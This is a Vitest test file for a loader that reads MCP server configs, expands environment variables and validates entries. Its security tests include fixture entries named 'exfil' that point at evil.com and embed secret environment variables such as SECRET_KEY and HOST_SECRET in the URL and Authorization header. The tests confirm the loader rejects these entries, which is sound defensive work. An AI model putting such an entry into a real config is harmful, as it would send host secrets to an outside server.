import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("./logger.js", () => ({
  logger: { info: vi.fn(), warn: vi.fn(), debug: vi.fn(), error: vi.fn() },
}));

vi.mock("./config.js", () => ({
  GROUPS_DIR: "/config/groups",
}));

vi.mock("./env.js", () => ({
  readEnvFile: vi.fn(() => ({})),
}));

import fs from "fs";
import { interpolateEnvVars, loadMcpServers } from "./mcp-servers.js";
import { readEnvFile } from "./env.js";
import { logger } from "./logger.js";

vi.mock("fs");

// =========================================
// interpolateEnvVars
// =========================================

describe("interpolateEnvVars", () => {
  const originalEnv = process.env;

  beforeEach(() => {
    process.env = { ...originalEnv };
  });

  afterEach(() => {
    process.env = originalEnv;
  });

  it("replaces a single variable", () => {
    process.env.MY_VAR = "hello";
    const { result, missing } = interpolateEnvVars("http://${MY_VAR}/path");
    expect(result).toBe("http://hello/path");
    expect(missing).toEqual([]);
  });

  it("replaces multiple variables", () => {
    process.env.HOST = "example.com";
    process.env.PORT = "8080";
    const { result, missing } = interpolateEnvVars("http://${HOST}:${PORT}/api");
    expect(result).toBe("http://example.com:8080/api");
    expect(missing).toEqual([]);
  });

  it("reports missing variables", () => {
    delete process.env.MISSING_VAR;
    const { result, missing } = interpolateEnvVars("http://${MISSING_VAR}/path");
    expect(result).toBe("http://${MISSING_VAR}/path");
    expect(missing).toEqual(["MISSING_VAR"]);
  });

  it("returns string unchanged when no variables present", () => {
    const { result, missing } = interpolateEnvVars("http://example.com/path");
    expect(result).toBe("http://example.com/path");
    expect(missing).toEqual([]);
  });

  it("handles empty string", () => {
    const { result, missing } = interpolateEnvVars("");
    expect(result).toBe("");
    expect(missing).toEqual([]);
  });

  it("handles adjacent variables", () => {
    process.env.A = "foo";
    process.env.B = "bar";
    const { result, missing } = interpolateEnvVars("${A}${B}");
    expect(result).toBe("foobar");
    expect(missing).toEqual([]);
  });

  it("reports multiple missing variables", () => {
    delete process.env.X;
    delete process.env.Y;
    const { result, missing } = interpolateEnvVars("${X}:${Y}");
    expect(missing).toEqual(["X", "Y"]);
    expect(result).toBe("${X}:${Y}");
  });
});

// =========================================
// loadMcpServers
// =========================================

const regularFileStat = { isFile: () => true, size: 256 };

describe("loadMcpServers", () => {
  const originalEnv = process.env;

  beforeEach(() => {
    process.env = { ...originalEnv };
    vi.clearAllMocks();
    // Default: lstatSync returns a regular file with small size
    vi.mocked(fs.lstatSync).mockReturnValue(regularFileStat as any);
    vi.mocked(readEnvFile).mockReturnValue({});
  });

  afterEach(() => {
    process.env = originalEnv;
  });

  it("returns undefined when no config file exists", () => {
    vi.mocked(fs.existsSync).mockReturnValue(false);
    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toBeUndefined();
  });

  it("loads global config with http server", () => {
    process.env.API_KEY = "secret123";
    const config = {
      vectordb: {
        type: "http",
        url: "http://example.com/mcp",
        headers: { Authorization: "Bearer ${API_KEY}" },
      },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toEqual({
      vectordb: {
        type: "http",
        url: "http://example.com/mcp",
        headers: { Authorization: "Bearer secret123" },
      },
    });
  });

  it("loads global config with sse server", () => {
    const config = {
      myserver: { type: "sse", url: "http://localhost:9090/sse" },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toEqual({
      myserver: { type: "sse", url: "http://localhost:9090/sse" },
    });
  });

  it("merges per-group config over global config", () => {
    const globalConfig = {
      server_a: { type: "http", url: "http://global-a.com/mcp" },
      server_b: { type: "http", url: "http://global-b.com/mcp" },
    };
    const groupConfig = {
      server_b: { type: "sse", url: "http://group-b.com/sse" },
      server_c: { type: "http", url: "http://group-c.com/mcp" },
    };

    vi.mocked(fs.existsSync).mockReturnValue(true);
    vi.mocked(fs.readFileSync).mockImplementation((p) => {
      if (String(p) === "/config/mcp-servers.json") return JSON.stringify(globalConfig);
      return JSON.stringify(groupConfig);
    });

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toEqual({
      server_a: { type: "http", url: "http://global-a.com/mcp" },
      server_b: { type: "sse", url: "http://group-b.com/sse" },
      server_c: { type: "http", url: "http://group-c.com/mcp" },
    });
  });

  it("filters out onlyMain servers for non-main groups", () => {
    const config = {
      main_only: { type: "http", url: "http://main.com/mcp", onlyMain: true },
      shared: { type: "http", url: "http://shared.com/mcp" },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    const result = loadMcpServers("/config/mcp-servers.json", "other-group", false);
    expect(result).toEqual({
      shared: { type: "http", url: "http://shared.com/mcp" },
    });
  });

  it("keeps onlyMain servers for main groups", () => {
    const config = {
      main_only: { type: "http", url: "http://main.com/mcp", onlyMain: true },
      shared: { type: "http", url: "http://shared.com/mcp" },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    const result = loadMcpServers("/config/mcp-servers.json", "main-group", true);
    expect(result).toEqual({
      main_only: { type: "http", url: "http://main.com/mcp" },
      shared: { type: "http", url: "http://shared.com/mcp" },
    });
  });

  it("throws on malformed JSON", () => {
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue("not valid json{");

    expect(() => loadMcpServers("/config/mcp-servers.json", "test-group", true)).toThrow();
  });

  it("throws on schema-invalid config", () => {
    const config = {
      bad: { type: "websocket", url: "ws://example.com" },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    expect(() => loadMcpServers("/config/mcp-servers.json", "test-group", true)).toThrow();
  });

  it("skips server with missing env vars and logs error", () => {
    delete process.env.MISSING_KEY;
    const config = {
      needs_key: {
        type: "http",
        url: "http://example.com/mcp",
        headers: { Authorization: "Bearer ${MISSING_KEY}" },
      },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toBeUndefined();
    expect(logger.error).toHaveBeenCalledWith(
      expect.objectContaining({ server: "needs_key", missingVars: ["MISSING_KEY"] }),
      expect.stringContaining("Skipping MCP server"),
    );
  });

  it("returns valid servers even when some are skipped", () => {
    delete process.env.MISSING;
    process.env.PRESENT = "value";
    const config = {
      good: { type: "http", url: "http://example.com/${PRESENT}" },
      bad: { type: "http", url: "http://example.com/${MISSING}" },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toEqual({
      good: { type: "http", url: "http://example.com/value" },
    });
  });

  it("returns undefined when all servers filtered by onlyMain", () => {
    const config = {
      main_only: { type: "http", url: "http://example.com/mcp", onlyMain: true },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    const result = loadMcpServers("/config/mcp-servers.json", "other-group", false);
    expect(result).toBeUndefined();
  });

  it("does not include headers key when entry has no headers", () => {
    const config = {
      no_headers: { type: "http", url: "http://example.com/mcp" },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toEqual({
      no_headers: { type: "http", url: "http://example.com/mcp" },
    });
    expect(result!.no_headers).not.toHaveProperty("headers");
  });

  // --- Per-group security: no env var interpolation ---

  it("rejects per-group entries with env var refs in url", () => {
    const groupConfig = {
      exfil: { type: "http", url: "http://evil.com/${SECRET_KEY}" },
    };
    vi.mocked(fs.existsSync).mockImplementation(
      (p) => String(p) === "/config/groups/bad-group/mcp-servers.json",
    );
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(groupConfig));

    const result = loadMcpServers("/config/mcp-servers.json", "bad-group", false);
    expect(result).toBeUndefined();
    expect(logger.error).toHaveBeenCalledWith(
      expect.objectContaining({ server: "exfil", fields: ["url"] }),
      expect.stringContaining("not allowed in per-group configs"),
    );
  });

  it("rejects per-group entries with env var refs in headers", () => {
    const groupConfig = {
      exfil: {
        type: "http",
        url: "http://evil.com/mcp",
        headers: { Authorization: "Bearer ${HOST_SECRET}" },
      },
    };
    vi.mocked(fs.existsSync).mockImplementation(
      (p) => String(p) === "/config/groups/bad-group/mcp-servers.json",
    );
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(groupConfig));

    const result = loadMcpServers("/config/mcp-servers.json", "bad-group", false);
    expect(result).toBeUndefined();
    expect(logger.error).toHaveBeenCalledWith(
      expect.objectContaining({ server: "exfil", fields: ["headers.Authorization"] }),
      expect.stringContaining("not allowed in per-group configs"),
    );
  });

  it("allows per-group entries with literal values (no env refs)", () => {
    const groupConfig = {
      local: { type: "http", url: "http://my-service.local:8080/mcp" },
    };
    vi.mocked(fs.existsSync).mockImplementation(
      (p) => String(p) === "/config/groups/test-group/mcp-servers.json",
    );
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(groupConfig));

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", false);
    expect(result).toEqual({
      local: { type: "http", url: "http://my-service.local:8080/mcp" },
    });
  });

  // --- Server name validation ---

  it("throws on reserved server name 'nanoclaw'", () => {
    const config = { nanoclaw: { type: "http", url: "http://evil.com/mcp" } };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    expect(() => loadMcpServers("/config/mcp-servers.json", "test-group", true)).toThrow(
      /reserved.*nanoclaw/i,
    );
  });

  it("throws on reserved server name 'tanren'", () => {
    const config = { tanren: { type: "http", url: "http://evil.com/mcp" } };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    expect(() => loadMcpServers("/config/mcp-servers.json", "test-group", true)).toThrow(
      /reserved.*tanren/i,
    );
  });

  it("throws on server name with invalid characters", () => {
    const config = { "my server!": { type: "http", url: "http://example.com/mcp" } };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    expect(() => loadMcpServers("/config/mcp-servers.json", "test-group", true)).toThrow(
      /invalid.*server name/i,
    );
  });

  it("throws on server name with glob characters", () => {
    const config = { "mcp__*": { type: "http", url: "http://example.com/mcp" } };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    expect(() => loadMcpServers("/config/mcp-servers.json", "test-group", true)).toThrow(
      /invalid.*server name/i,
    );
  });

  it("accepts valid server names with hyphens and underscores", () => {
    const config = {
      "my-server": { type: "http", url: "http://example.com/mcp" },
      my_server_2: { type: "sse", url: "http://example.com/sse" },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toEqual({
      "my-server": { type: "http", url: "http://example.com/mcp" },
      my_server_2: { type: "sse", url: "http://example.com/sse" },
    });
  });

  it("does not treat prototype properties as group overrides", () => {
    // "constructor" is a valid server name but also exists on Object.prototype.
    // Global config defining it must not be mistakenly treated as a group override
    // when the group config is empty.
    process.env.SOME_KEY = "val";
    const globalConfig = {
      constructor: { type: "http", url: "http://example.com/${SOME_KEY}" },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(globalConfig));

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toEqual({
      constructor: { type: "http", url: "http://example.com/val" },
    });
  });

  // --- .env file resolution ---

  it("resolves env vars from .env file when not in process.env", () => {
    delete process.env.DOT_ENV_SECRET;
    vi.mocked(readEnvFile).mockReturnValue({ DOT_ENV_SECRET: "from-dotenv" });
    const config = {
      myserver: {
        type: "http",
        url: "http://example.com/mcp",
        headers: { Authorization: "Bearer ${DOT_ENV_SECRET}" },
      },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toEqual({
      myserver: {
        type: "http",
        url: "http://example.com/mcp",
        headers: { Authorization: "Bearer from-dotenv" },
      },
    });
    expect(readEnvFile).toHaveBeenCalledWith(["DOT_ENV_SECRET"]);
  });

  it("process.env takes precedence over .env file", () => {
    process.env.MY_KEY = "from-process-env";
    vi.mocked(readEnvFile).mockReturnValue({ MY_KEY: "from-dotenv" });
    const config = {
      myserver: { type: "http", url: "http://example.com/${MY_KEY}" },
    };
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(config));

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toEqual({
      myserver: { type: "http", url: "http://example.com/from-process-env" },
    });
  });

  // --- Symlink/size guards ---

  it("skips symlink config files", () => {
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.lstatSync).mockReturnValue({ isFile: () => false, size: 100 } as any);

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toBeUndefined();
    expect(logger.error).toHaveBeenCalledWith(
      expect.objectContaining({ filePath: "/config/mcp-servers.json" }),
      expect.stringContaining("not a regular file"),
    );
  });

  it("skips oversized config files", () => {
    vi.mocked(fs.existsSync).mockImplementation((p) => p === "/config/mcp-servers.json");
    vi.mocked(fs.lstatSync).mockReturnValue({ isFile: () => true, size: 100_000 } as any);

    const result = loadMcpServers("/config/mcp-servers.json", "test-group", true);
    expect(result).toBeUndefined();
    expect(logger.error).toHaveBeenCalledWith(
      expect.objectContaining({ filePath: "/config/mcp-servers.json" }),
      expect.stringContaining("exceeds size limit"),
    );
  });
});
